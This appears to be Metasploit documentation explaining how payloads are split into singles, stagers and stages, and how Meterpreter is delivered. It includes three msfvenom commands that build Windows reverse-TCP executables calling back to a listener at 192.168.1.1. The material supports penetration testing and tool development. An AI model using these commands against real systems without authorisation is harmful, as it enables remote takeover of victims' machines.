Payloads are defined in ```modules/payloads/{singles,stages,stagers}/<platform>```. When the framework starts up, stages are combined with stagers to create a complete payload that you can use in exploits. Then, handlers are paired with payloads so the framework will know how to create sessions with a given communications mechanism.

Payloads are given reference names that indicate all the pieces, like so:
  - Staged payloads: ```<platform>/[arch]/<stage>/<stager>```
  - Single payloads: ```<platform>/[arch]/<single>```

### Singles
Single payloads are fire-and-forget. They can create a communications mechanism with Metasploit, but they don't have to. An example of a scenario where you might want a single is when the target has no network access -- a fileformat exploit delivered via USB key is still possible.

### Stagers
Stagers are a small stub designed to create some form of communication and then pass execution to the next stage. Using a stager solves two problems. First, it allows us to use a small payload initially to load up a larger payload with more functionality. Second, it makes it possible to separate the communications mechanism from the final stage so one payload can be used with multiple transports without duplicating code.

### Stages
Since the stager will have taken care of dealing with any size restrictions by allocating a big chunk of memory for us to run in, stages can be arbitrarily large. One advantage of that is the ability to write final-stage payloads in a higher-level language like C.

## Meterpreter
To avoid confusion, the victim running meterpreter is always called the server and the ruby side controlling it is always called the client, regardless of the direction of the original connection.

The Meterpreter server is broken into several pieces:
  - ```metsrv.dll``` - this is the heart of meterpreter where the protocol and extension systems are implemented
  - ```ext_server_stdapi.dll``` - this extension implements most of the commands familiar to users
  - ```ext_server_*.dll``` - other extensions provide further functionality

### Delivering Meterpreter

1. Using a technique developed by Stephen Fewer, metsrv.dll's header is modified to be usable as shellcode. From there, Metasploit can embed it in an executable or run it via an exploit like any other shellcode.

1. The IP address and port you want the payload to connect back to are embedded in the stager. As discussed above, all staged payloads are no more than a small stub that sets up communication and executes the next stage. When you create an executable using a staged payload, you're really just creating the stager. So the following commands would create functionally identical exe files:
```
    msfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp
    msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp
    msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp
```
(Note that these are functionally identical -- there is a lot of randomization that goes into it so no two executables are the same.)

1. The Ruby side acts as a client, speaking the meterpreter wire protocol over whichever transport mechanism was set up by the stager (tcp or http(s)).
